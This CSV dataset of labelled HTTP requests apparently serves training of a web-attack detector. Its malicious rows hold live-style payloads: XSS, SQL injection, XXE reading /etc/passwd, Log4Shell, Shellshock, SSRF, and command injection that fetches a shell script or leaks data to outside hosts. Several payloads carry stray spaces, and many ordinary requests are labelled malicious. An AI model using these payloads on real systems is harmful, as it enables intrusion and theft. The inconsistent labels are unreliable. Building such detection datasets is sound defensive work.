method,path,query,headers,body,ua,label
GET,javascript:%ef%bb%bfalert(XSS),,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/media/insert-tag-MEgxVwMD.png,,,HTTP/1.1,,0
GET,/media/insert-button-4jI7OTIc.css,,,HTTP/1.1,,0
GET,/media/onerror-zone-P8zBRKnq.woff2,,,HTTP/1.1,,0
GET,/static/css/drop-function-GZDFknUM.woff2,,,HTTP/1.1,,0
GET,/static/css/image-update-hrhYfChY.png,,,HTTP/1.1,,0
GET,id=1' OR '1'='1,,,,,1
GET,/build/union-icon-6xVygw5M.woff2,,,HTTP/1.1,,0
GET,/media/menu-union-TSVdzJqY.js,,,HTTP/1.1,,0
GET,../../../../tmp/shell.php (inside zip archive),,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/media/onerror-row-G8sUDKG8.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,<script>alert('XSS')</script>,,,,,1
GET,"<?xml version=""1.0"" encoding=""UTF-7""?> +ADwAIQ-DOCTYPE foo+AFs +ADwA IQ-ELEMENT foo ANY +AD4 +ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack- r.be:1337+ACI +AD4AXQA+ +ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4",,,,,1
GET,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/js/row-from-MZv0QJJ1.js,,,HTTP/1.1,,0
GET,;wget http://some_host/sh311.sh,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,ax--exec=`id`--remote=origin,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/build/row-drop-EYzS5IT7.css,,,HTTP/1.1,,0
GET,"<!--#exec cmd=""dir"" -->",,,,,1
GET,/build/from.svg,,,HTTP/1.1,,0
GET,/media/insert-date-XKzujqwY.woff2,,,HTTP/1.1,,0
GET,/static/css/onerror.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/css/eval.min.css,,,HTTP/1.1,,0
GET,/media/onerror-dialog-R954FT7Z.png,,,HTTP/1.1,,0
GET,"data:text/html,<form action=https://127.0.0.1/xss-cp.php method=post ><input type=hidden name=a value=""<img/src=//127.0.0.1/yt.jpg onpoin terenter=alert`1`>""><input type=submit></form>",,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/build/insert.min.js,,,HTTP/1.1,,0
GET,/media/insert-menu-hRmpIsmJ.js,,,HTTP/1.1,,0
GET,/assets/insert.min.js,,,HTTP/1.1,,0
GET,/assets/select-widget-kKMnldZb.png,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,?8dfc44c3c7=%28xss%22%3E%3C%21--%3E%3Csvg%2Fonload=alert%28document.domain%29%3E%29,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,javascript:alert(1),,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,"prompt.call(null,1)",,,,,1
GET,/assets/cat-widget-tgjMgukJ.js,,,HTTP/1.1,,0
GET,/assets/union-function-oezJjRB5.svg,,,HTTP/1.1,,0
GET,/*!%55NiOn*/%20/*!%53eLEct*/+,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/js/menu-onerror-EkQyotDH.woff2,,,HTTP/1.1,,0
GET,/media/cat.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,union select,,,,,1
GET,/,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY data SYSTEM ""netdoc:/et c/passwd"">]><foo>&data;</foo>",,,,,1
GET,/,,,,,0
GET,/static/css/insert.min.js,,,HTTP/1.1,,0
GET,/media/dialog-where-xLn6RTFB.png,,,HTTP/1.1,,0
GET,/,"""OnCliCk=""(prompt`1`)",,,,1
GET,admin*)(| (password=*)),,,,,1
GET,Host: evil.com,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/js/script-form-4tKfXqsB.woff2,,,HTTP/1.1,,0
GET,/static/js/button-onerror-7qHYtIIF.png,,,HTTP/1.1,,0
GET,/build/from.css,,,HTTP/1.1,,0
GET,/static/css/cat.png,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/media/cat.jpg,,,HTTP/1.1,,0
GET,/assets/drop.css,,,HTTP/1.1,,0
GET,/,onerror=alert(1),,,,1
GET,/,<svg%0Aonauxclick=0;[1].some(confirm)//,,,,1
GET,/static/js/where-image-IeY3hBnG.woff2,,,HTTP/1.1,,0
GET,/build/update.min.js,,,HTTP/1.1,,0
GET,/,url=http://malicious.com,,,,1
GET,/build/delete.jpg,,,HTTP/1.1,,0
GET,/build/script.jpg,,,HTTP/1.1,,0
GET,/media/eval-tag-XN5mXHLe.svg,,,HTTP/1.1,,0
GET,"<j id=x style=""-webkit-user-modify:read-write"" onfocus={window.onerr or=eval}throw/0/+name>H</j>#x",,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,1e1 union select users from password,,,,,1
GET,/media/handler-where-251kVnPZ.js,,,HTTP/1.1,,0
GET,/build/function-where-gRfQ5s11.jpg,,,HTTP/1.1,,0
GET,/static/css/zone-select-1tmG41jJ.js,,,HTTP/1.1,,0
GET,/media/update.css,,,HTTP/1.1,,0
GET,/media/insert.png,,,HTTP/1.1,,0
GET,/,ax--exec=`id`--remote=origin,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/static/css/tag-whoami-JQf1W1y8.js,,,HTTP/1.1,,0
GET,select from,,,,,1
GET,/media/date-where-0SPUczna.jpg,,,HTTP/1.1,,0
GET,/build/from-handler-CQ6v4PP9.svg,,,HTTP/1.1,,0
GET,/static/css/date-whoami-8fLcc2N8.jpg,,,HTTP/1.1,,0
GET,/build/function-eval-7FzjH5px.png,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,?d7f86bf74f=123%29%20AND%2012=12%20%20AND%20JSON_DEPTH%28%27%7B%7D%27%29%20%21=%202521,,,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,"""Onx=() onMouSeoVer=prompt(1)>",,,,,1
GET,/assets/alert.js,,,HTTP/1.1,,0
GET,| set /a 3482*7301,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/assets/dialog-update-iun2zqcO.js,,,HTTP/1.1,,0
GET,/static/css/onerror.woff2,,,HTTP/1.1,,0
GET,/assets/clause-script-UXxfrD1i.css,,,HTTP/1.1,,0
GET,X-Forwarded-Host: attacker.com,,,,,1
GET,/,,,,,0
GET,/static/js/image-alert-grLkWcnt.js,,,HTTP/1.1,,0
GET,0;var date=new Date(); do{curDate = new Date();}while(curDate-date<1 0000),,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,; /bin/c?t /e*c/p?sswd,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,"""><video><source onerror=eval(atob(http://some_host)) id=dmFyIGE9ZG9 jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5 ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#6 1;>",,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,"""OnCliCk=""(prompt`1`)",,,,1
GET,/static/js/delete-clause-TD4slvS0.woff2,,,HTTP/1.1,,0
GET,/media/insert.css,,,HTTP/1.1,,0
GET,/static/js/row-eval-jBWqII9Z.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/media/button-union-guAqdL7d.js,,,HTTP/1.1,,0
GET,/,url=http://malicious.com,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/build/alert-type-QYx2Wmxw.jpg,,,HTTP/1.1,,0
GET,"id=1 UNION SELECT null, user(), database()--",,,,,1
GET,/static/css/whoami-form-qjAFho4B.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/assets/tag-from-FHKOokSk.jpg,,,HTTP/1.1,,0
GET,/,"eval(atob(""YWxlcnQoKQ==""))",,,,1
GET,/build/onerror.min.js,,,HTTP/1.1,,0
GET,/static/css/whoami.min.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,"true, $where: '99 == 88'",,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/assets/delete.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/css/eval.min.js,,,HTTP/1.1,,0
GET,/build/drop-button-hHjaVOh5.js,,,HTTP/1.1,,0
GET,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,,,1
GET,"3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping '+master.sy s.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.000.burpco l'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXE C sp_SYS_ProtoOp @id=3",,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,id=0x27204f52202731273d2731,,,,1
GET,/static/css/eval.jpg,,,HTTP/1.1,,0
GET,/static/js/from.png,,,HTTP/1.1,,0
GET,%0d%0a* CAPABILITY,,,,,1
GET,/static/css/image-onerror-RmPTqTRa.css,,,HTTP/1.1,,0
GET,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/assets/function-eval-yFeXScKU.woff2,,,HTTP/1.1,,0
GET,/,"""));if(!self.x)self.x=!alert(document.domain)}catch(e){}//",,,,1
GET,/build/delete.js,,,HTTP/1.1,,0
GET,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/static/css/button-where-p0eRcBLa.woff2,,,HTTP/1.1,,0
GET,/static/css/whoami-type-0kmv2Lka.svg,,,HTTP/1.1,,0
GET,/media/delete-zone-aMYUVfH6.png,,,HTTP/1.1,,0
GET,mercuryboard_user_agent_sql_injection.nasl' community-user-,,,,,1
GET,union select,,,,,1
GET,<script>alert('XSS')</script>,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/assets/script.woff2,,,HTTP/1.1,,0
GET,<script>alert('XSS')</script>,,,,,1
GET,/uploads/628668cae9db4d51b4edf55214b73fca-Facebook Image.jpg?response-content-disposition=inline%3B%20filename%2A%3DUTF-8%27%276b67c704b68a4517aa6664c1df2f7afe&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=9wnmzzHYVGwlnTscRdzx%2F20260310%2F%2Fs3%2Faws4_request&X-Amz-Date=20260310T023341Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=5bfffbe1cc40d1ef12ee72b2126381daf34408143c87a1c0bf11e66c162e101b&q=%3Cscript%3E%3C/script%3E,,,,,1
GET,/assets/insert-form-Xzfo9Nml.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/js/select.css,,,HTTP/1.1,,0
GET,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,,,1
GET,/static/js/cat.woff2,,,HTTP/1.1,,0
GET,/media/update-type-HNdpYSA7.js,,,HTTP/1.1,,0
GET,/static/css/insert-function-YGdE6gvc.js,,,HTTP/1.1,,0
GET,/media/insert.svg,,,HTTP/1.1,,0
GET,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/static/css/cat.png,,,HTTP/1.1,,0
GET,/build/whoami-function-Snps4y52.js,,,HTTP/1.1,,0
GET,/build/form-whoami-u9ugAYSz.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,db.injection.insert({success:1});,,,,,1
GET,/build/cat-row-ZkPLnree.jpg,,,HTTP/1.1,,0
GET,/,?a8aafb9364=%3Cimg%20src%20onerror=confirm%281%29%3E,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/static/css/insert.min.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,union select,,,,,1
GET,/static/css/handler-whoami-cV9NQjyK.jpg,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,| set /a 3482*7301,,,,,1
,/index.html,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,onerror=alert(1),,,,1
GET,/,"/""));if(!self.x)self.x=!alert(document.domain)}catch(e){}/",,,,1
GET,/media/alert.jpg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/media/update.min.css,,,HTTP/1.1,,0
GET,/static/js/form-update-l8stURvq.css,,,HTTP/1.1,,0
GET,/build/select.js,,,HTTP/1.1,,0
GET,' or '1'='1,,,,,1
GET,/media/update-zone-M1VjLbJE.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/assets/insert-clause-Aiwb43hm.png,,,HTTP/1.1,,0
GET,${jndi:ldap://attacker.com/a},,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/build/function-drop-I9QXl2mm.css,,,HTTP/1.1,,0
GET,<script>alert('XSS')</script>,,,,,1
GET,/build/icon-update-vhW5DnQn.jpg,,,HTTP/1.1,,0
GET,/static/css/drop-widget-GMvmPDK5.png,,,HTTP/1.1,,0
GET,<img src=x onerror=alert(document.domain)>/all,,,,,1
GET,/build/eval.min.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/static/js/zone-from-2ix6SMtF.js,,,HTTP/1.1,,0
GET,"', $or: [ {}, { 'order':'order",,,,,1
GET,id=1' OR '1'='1,,,,,1
GET,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@w63gecoroprj5um8ypnd7r 6in9t0hseg3.interact.sh community-user-",,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(1 5)))v)+'%22+(select(0)from(select(sleep(15)))v)+%22*/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/build/eval.jpg,,,HTTP/1.1,,0
GET,/build/select.jpg,,,HTTP/1.1,,0
GET,db.injection.insert%28%7Bsuccess:1%7D%29%3B,,,,,1
GET,/,,,,,0
GET,\\::1\c$\users\default\ntuser.dat,,,,,1
GET,RCPT TO: test@evil.com,,,,,1
GET,/media/onerror-handler-4fUMvniW.svg,,,HTTP/1.1,,0
GET,/static/css/insert-menu-cm1OukxR.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/js/insert-tag-jS1OYbi9.js,,,HTTP/1.1,,0
GET,"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""http://host/ text.txt"" > ] > <foo>&xxe;</foo>",,,,,1
GET,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/build/onerror-widget-KKGRyK26.js,,,HTTP/1.1,,0
GET,Host: evil.com,,,,,1
GET,/assets/alert.min.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,,,1
GET,/build/cat.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/js/eval.svg,,,HTTP/1.1,,0
GET,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,,,1
GET,/assets/whoami-dialog-7rXouUGh.css,,,HTTP/1.1,,0
GET,/build/drop-zone-dSUBwo3i.png,,,HTTP/1.1,,0
GET,ac ed 00 05 73 72 00 12 ...,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/assets/select.png,,,HTTP/1.1,,0
GET,"alert.apply(null, [1])",,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/build/from.css,,,HTTP/1.1,,0
GET,"id=1' AND 1=CONVERT(int, (SELECT password FROM users LIMIT 0,1))--",,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/static/js/union.woff2,,,HTTP/1.1,,0
